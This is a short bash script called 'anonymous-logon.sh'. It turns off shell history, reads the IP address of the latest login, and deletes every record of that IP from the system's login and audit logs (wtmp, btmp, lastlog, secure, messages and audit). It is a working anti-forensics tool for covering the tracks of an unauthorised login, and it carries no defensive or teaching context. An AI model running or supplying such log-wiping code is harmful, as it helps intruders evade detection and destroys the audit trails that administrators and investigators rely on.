#! /bin/bash
#  set +o history && bash anonymous-logon.sh

ip=$(last | head -n 1 | awk '{print $3}')
if [ -z $ip ] ;
then
    echo "ip is null, exit"
    exit
fi

## clear ip for logon
cd /var/log
for i in wtmp btmp;
do
    utmpdump $i > /tmp/$i.file
    sed -i "/$ip/"d /tmp/$i.file
    utmpdump -r < /tmp/$i.file > $i
    rm -f /tmp/$i.file
done

sed -i "/$ip/"d lastlog*
sed -i "/$ip/"d secure*
sed -i "/$ip/"d messages*
sed -i "/$ip/"d audit/*

cd ~
